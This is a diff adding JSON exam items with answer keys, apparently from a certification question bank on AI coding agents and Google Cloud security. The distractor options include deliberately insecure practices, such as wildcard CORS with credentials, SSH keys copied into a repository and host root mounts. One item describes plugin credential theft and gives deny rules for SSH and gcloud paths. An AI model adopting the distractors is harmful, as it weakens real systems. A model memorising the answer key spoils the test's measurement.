+      "Configure a Best-of-N competitive tournament subagent pattern: the parent orchestrator spawns 3 parallel subagents—assigning each a distinct algorithmic strategy in an isolated git worktree—runs an identical benchmark suite (`cargo bench`) against all 3 implementations, and merges the candidate that achieves the best empirical score while passing all correctness tests.",
+      "Ask the LLM to guess how many nanoseconds its code will take without compiling or running it."
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "The Best-of-N (competitive ensemble / tournament) subagent pattern leverages parallel agent execution in isolated Git worktrees (`git worktree add`) to explore divergent algorithmic solutions simultaneously. An objective, deterministic benchmark harness (`cargo bench`) evaluates each candidate, allowing the parent orchestrator to select the empirically superior implementation.",
+    "whyWrong": {
+      "0": "Running all 3 algorithms sequentially on every request triples latency and CPU consumption.",
+      "1": "Random selection without benchmarking forfeits empirical optimization.",
+      "3": "LLMs cannot accurately predict microsecond CPU cache and SIMD execution latencies without running real benchmarks."
+    },
+    "refs": [
+      "https://cloud.google.com/agent-builder/docs",
+      "https://git-scm.com/docs/git-worktree"
+    ]
+  },
+  {
+    "id": "d2-cod-094",
+    "domain": 2,
+    "topic": "Patching CSRF & Cookie Security Vulnerabilities",
+    "difficulty": "medium",
+    "type": "multi",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "A web security scan flagged a legacy Node.js/Express banking portal for Cross-Site Request Forgery (CSRF) on state-changing `POST /api/transfer` endpoints and insecure session cookie flags. You task an Antigravity coding agent with remediating these findings and verifying the fix. Which two code and verification changes should the agent implement? (Choose two.)",
+    "options": [
+      "Execute an automated headless DAST scan (such as OWASP ZAP via an MCP tool) and cross-origin integration tests against a staging instance to confirm that forged cross-site POST requests without valid CSRF tokens are rejected with `HTTP 403 Forbidden`.",
+      "Change all `POST /api/transfer` endpoints to `GET /api/transfer` so parameters are visible in browser history and server access logs.",
+      "Configure session cookies with `HttpOnly: true`, `Secure: true`, and `SameSite: 'Strict'` (or `'Lax'`), and implement cryptographic anti-CSRF synchronizer tokens (or Double-Submit Cookie validation) on all state-mutating POST/PUT/DELETE routes.",
+      "Set `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` on all banking endpoints.",
+      "Store the user's session password in `window.localStorage` accessible to third-party analytics scripts."
+    ],
+    "answer": [
+      0,
+      2
+    ],
+    "explanation": "Defending against CSRF requires combining strict cookie attributes (`SameSite=Strict/Lax`, `Secure`, `HttpOnly`) with cryptographic anti-CSRF tokens on state-changing endpoints. Verifying the fix with an automated DAST scanner (OWASP ZAP via MCP) and negative integration tests ensures cross-origin forged requests are deterministically blocked.",
+    "whyWrong": {
+      "1": "Using `GET` for state-changing financial transfers violates HTTP semantics, leaks sensitive data in URLs, and makes CSRF attacks trivial via `<img>` tags.",
+      "3": "Allowing wildcard CORS origins with credentials exposes authenticated endpoints to arbitrary malicious websites.",
+      "4": "Storing credentials in `localStorage` exposes them to exfiltration via any XSS vulnerability."
+    },
+    "refs": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
+      "https://www.zaproxy.org/"
+    ]
+  },
+  {
+    "id": "d2-cod-095",
+    "domain": 2,
+    "topic": "Antigravity Plugin Capability Sandboxing",
+    "difficulty": "hard",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "Your engineering team wants to adopt a community-contributed Antigravity Plugin that formats Markdown tables and generates Mermaid diagrams. However, your security team is concerned that a malicious update to this plugin could attempt to read developers' private SSH keys (`~/.ssh/id_ed25519`), Google Cloud ADC tokens (`~/.config/gcloud/`), or exfiltrate workspace code over the network. How should you sandbox this plugin using Antigravity's plugin security model?",
+    "options": [
+      "Run the community plugin as `root` on the host OS and trust that open-source authors never get compromised.",
+      "Copy `~/.ssh/id_ed25519` into the repository root so the plugin doesn't have to look in `~/.ssh`.",
+      "Disable antivirus and firewall software whenever running Markdown plugins.",
+      "Configure the Antigravity Plugin execution policy in `plugin.yaml` / Agents CLI to run inside a capability-restricted sandbox with `network: none` (zero outbound network access) and explicit filesystem mount allowlists restricted solely to the active workspace's `.md` files, denying access to `~/.ssh` and `~/.config/gcloud`."
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "Antigravity's plugin security architecture enforces least-privilege capability manifests: restricting a formatting plugin to `network: none` and scoping filesystem read/write mounts strictly to workspace `.md` files (blocking `$HOME/.ssh` and `$HOME/.config/gcloud`) prevents credential theft and network exfiltration even if the plugin code is compromised.",
+    "whyWrong": {
+      "0": "Running third-party plugins as root without isolation exposes the entire developer workstation to supply-chain attacks.",
+      "1": "Copying private SSH keys into workspace directories risks committing private keys to Git.",
+      "2": "Disabling host security controls increases vulnerability to malware."
+    },
+    "refs": [
+      "https://cloud.google.com/agent-builder/docs",
+      "https://cloud.google.com/security/best-practices"
+    ]
+  },
+  {
+    "id": "d2-cod-096",
+    "domain": 2,
+    "topic": "Optimizing Python Asyncio Event Loop Bottlenecks",
+    "difficulty": "hard",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "A Python FastAPI microservice running on Cloud Run uses `async def` endpoints to handle 500 concurrent requests per instance. However, under load, throughput collapses and event loop lag spikes to 2.5 seconds. You task an Antigravity coding agent with diagnosing and resolving the concurrency bottleneck. What root cause should the agent search for and refactor?",
+    "options": [
+      "Identify synchronous, thread-blocking I/O or CPU-bound calls invoked directly inside `async def` coroutines (such as synchronous `requests.get()`, `time.sleep()`, or synchronous `psycopg2` queries) using `py-spy` / asyncio debug mode, and refactor them to non-blocking async equivalents (`httpx.AsyncClient`, `asyncio.sleep()`, `asyncpg`) or offload CPU work via `asyncio.to_thread()`.",
+      "Remove the `async` keyword from all functions and set Cloud Run concurrency to 1 request per VM.",
+      "Add a `while True: pass` busy-wait loop inside the main event loop.",
+      "Replace FastAPI with a bash CGI script from 1998."
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "In Python's single-threaded `asyncio` event loop, invoking synchronous blocking calls (`requests.get`, synchronous DB drivers, or heavy CPU loops) directly inside an `async def` coroutine blocks the entire OS thread, freezing all 500 concurrent requests. Refactoring to true non-blocking async drivers (`httpx.AsyncClient`, `asyncpg`) or using `asyncio.to_thread()` restores event loop responsiveness.",
+    "whyWrong": {
+      "1": "Setting Cloud Run concurrency to 1 increases infrastructure costs by 500x for I/O-bound workloads.",
+      "2": "A `while True: pass` infinite loop pegs CPU at 100% and permanently freezes the event loop.",
+      "3": "CGI scripts spawn a new OS process per request, resulting in terrible latency and resource exhaustion."
+    },
+    "refs": [
+      "https://docs.python.org/3/library/asyncio-dev.html#running-blocking-code",
+      "https://fastapi.tiangolo.com/async/"
+    ]
+  },
+  {
+    "id": "d2-cod-097",
+    "domain": 2,
+    "topic": "Claude Code Cross-Project IAM & Shared Resources",
+    "difficulty": "medium",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "Your enterprise organizes Google Cloud resources into a hub-and-spoke architecture: centralized Vertex AI Model Garden endpoints and shared Artifact Registry base images live in `prj-central-ai-hub`, while product engineering teams run Claude Code on Cloud Workstations inside spoke projects (`prj-product-alpha`, `prj-product-beta`). Engineers in `prj-product-alpha` receive `PERMISSION_DENIED` when their Claude Code CLI attempts to invoke the Claude model endpoint in `prj-central-ai-hub`. What is the least-privilege IAM configuration to resolve this?",
+    "options": [
+      "Grant `allUsers` the `roles/owner` role on `prj-central-ai-hub`.",
+      "Grant the `prj-product-alpha` workstation service account (or the engineers' Google IAM group) the `roles/aiplatform.user` role on the `prj-central-ai-hub` project (or specific Vertex AI Endpoint resource) and `roles/artifactregistry.reader` on the shared repository.",
+      "Copy and deploy duplicate Vertex AI endpoints and Artifact Registry repositories into every developer's personal Gmail account.",
+      "Export service account JSON keys from `prj-central-ai-hub` and email them to external contractors."
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "In a hub-and-spoke Google Cloud architecture, cross-project access is governed cleanly via IAM bindings on the hub resources: granting `roles/aiplatform.user` on `prj-central-ai-hub` enables spoke principals to invoke Vertex AI Model Garden endpoints, while `roles/artifactregistry.reader` grants read-only container image pull access.",
+    "whyWrong": {
+      "0": "Granting `allUsers` owner access exposes central enterprise AI and container infrastructure to the public internet.",
+      "2": "Personal Gmail accounts violate corporate data governance and cannot host enterprise VPC-SC protected resources.",
+      "3": "Exporting and emailing JSON keys violates keyless authentication best practices."
+    },
+    "refs": [
+      "https://cloud.google.com/vertex-ai/docs/general/access-control",
+      "https://cloud.google.com/artifact-registry/docs/access-control"
+    ]
+  },
+  {
+    "id": "d2-cod-098",
+    "domain": 2,
+    "topic": "Agents CLI Policy Enforcement for OSS License Compliance",
+    "difficulty": "medium",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "A commercial SaaS software vendor distributes proprietary closed-source software. Legal counsel mandates that coding agents must never add third-party open-source dependencies licensed under strong copyleft licenses (`AGPL-3.0`, `GPL-3.0`, `SSPL`) to any production microservice repository. How should you enforce this license governance across all Antigravity coding agents?",
+    "options": [
+      "Ask developers to delete `LICENSE` files from downloaded node_modules folders so the lawyers don't see them.",
+      "Ban all open-source software including MIT and Apache-2.0 libraries.",
+      "Configure a pre-commit / package-install extension hook governed via Agents CLI that runs an SBOM license scanner (`license-checker`, `pip-licenses`, or Google Cloud Artifact Analysis SBOM inspection) and blocks any dependency addition whose SPDX license identifier matches the prohibited copyleft list (`AGPL-3.0`, `GPL-3.0`, `SSPL`).",
+      "Have the coding agent rewrite the GPL license text inside third-party packages to say `Proprietary`."
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "Enforcing open-source license compliance requires deterministic inspection of Software Bill of Materials (SBOM) metadata and SPDX license identifiers during dependency installation or pre-commit hooks. Blocking prohibited copyleft licenses (`AGPL-3.0`, `SSPL`) automatically prevents legal contamination of proprietary repositories.",
+    "whyWrong": {
+      "0": "Deleting license files or altering copyright notices is illegal copyright infringement and does not alter the underlying license obligations.",
+      "1": "Banning permissive OSS licenses (MIT, Apache-2.0) cripples modern software engineering unnecessarily.",
+      "3": "Unilaterally changing a third-party author's license text is unlawful."
+    },
+    "refs": [
+      "https://cloud.google.com/artifact-analysis/docs/sbom-overview",
+      "https://spdx.org/licenses/"
+    ]
+  },
+  {
+    "id": "d2-cod-099",
+    "domain": 2,
+    "topic": "Google Cloud Pub/Sub & Eventarc MCP Server Design",
+    "difficulty": "hard",
+    "type": "multi",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "Your event-driven microservices architecture uses Google Cloud Pub/Sub with Avro/Protobuf schemas and dead-letter queues (DLQs). When poison-pill messages accumulate in a DLQ, you want an Antigravity coding agent to inspect sample dead-letter messages, identify why the subscriber microservice failed deserialization or validation, patch the subscriber code, and safely test replay without duplicating production side effects. Which two capabilities should you build into your Pub/Sub MCP Server? (Choose two.)",
+    "options": [
+      "Allow the coding agent to delete production Pub/Sub schemas whenever a deserialization error occurs.",
+      "Provide an isolated sandbox replay tool that publishes sanitized test payloads to a local Cloud Pub/Sub Emulator instance (or staging topic) rather than re-injecting unverified messages directly into the live production topic.",
+      "Configure the MCP tool to automatically `ACK` and permanently delete all messages in all production Dead-Letter Queues before inspecting them.",
+      "Provide a read-only MCP tool that pulls a bounded sample of messages from the Dead-Letter Subscription with `ack` disabled (or via a non-destructive snapshot/seek preview) and validates them against the Cloud Pub/Sub Schema Registry.",
+      "Hardcode production customer credit card numbers into the MCP server's public README file."
+    ],
+    "answer": [
+      1,
+      3
+    ],
+    "explanation": "Inspecting DLQ messages safely requires non-destructive sampling (pulling without acknowledging or inspecting via snapshots) and schema validation against the Pub/Sub Schema Registry. Testing the patched subscriber logic against the Cloud Pub/Sub Emulator or an isolated staging topic verifies the fix without triggering duplicate financial or operational side effects in production.",
+    "whyWrong": {
+      "0": "Deleting production schemas breaks schema enforcement for all upstream publishers.",
+      "2": "Acknowledging and deleting all DLQ messages before inspection permanently destroys failed customer transactions.",
+      "4": "Exposing customer credit card numbers in README files violates PCI-DSS and data privacy laws."
+    },
+    "refs": [
+      "https://cloud.google.com/pubsub/docs/dead-letter-topics",
+      "https://cloud.google.com/pubsub/docs/emulator"
+    ]
+  },
+  {
+    "id": "d2-cod-100",
+    "domain": 2,
+    "topic": "GKE Sandbox Ephemeral Storage & DiskPressure Protection",
+    "difficulty": "medium",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "Your platform runs autonomous coding agent pods on GKE Sandbox nodes. During a fuzz-testing task, an errant coding agent wrote 150 GB of temporary log files and core dumps into its `/workspace` directory (`emptyDir`), filling up the underlying GKE node's boot disk. This triggered a node-level `DiskPressure` condition and caused the kubelet to evict critical neighboring pods on that node. How should you prevent coding agent pods from exhausting node disk capacity?",
+    "options": [
+      "Attach a 100-Terabyte local SSD to every GKE node and disable disk monitoring.",
+      "Run a cron job on the host node that deletes random files across all containers every 30 seconds.",
+      "Mount the host node's root filesystem (`/`) with write permissions inside the untrusted agent container.",
+      "Specify an explicit `sizeLimit` (e.g., `sizeLimit: 10Gi`) on all `emptyDir` volumes and set `requests.ephemeral-storage` and `limits.ephemeral-storage` in the coding agent container's `resources` specification so the kubelet immediately evicts only the offending agent pod if it exceeds its storage quota."
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "In Kubernetes, setting `emptyDir.sizeLimit` along with container `resources.limits.ephemeral-storage` enforces strict per-pod disk quotas tracked by the kubelet. If a coding agent writes excessive temporary files, the kubelet evicts only that specific pod before node-wide `DiskPressure` affects neighboring workloads.",
+    "whyWrong": {
+      "0": "Over-provisioning massive local SSDs is prohibitively expensive and still vulnerable to unbounded infinite loops.",
+      "1": "Deleting random files across containers corrupts active builds and databases.",
+      "2": "Mounting the host root filesystem (`/`) read-write enables trivial host compromise."
+    },
+    "refs": [
+      "https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/#local-ephemeral-storage",
+      "https://cloud.google.com/kubernetes-engine/docs/concepts/local-ssd"
+    ]
+  }
+]
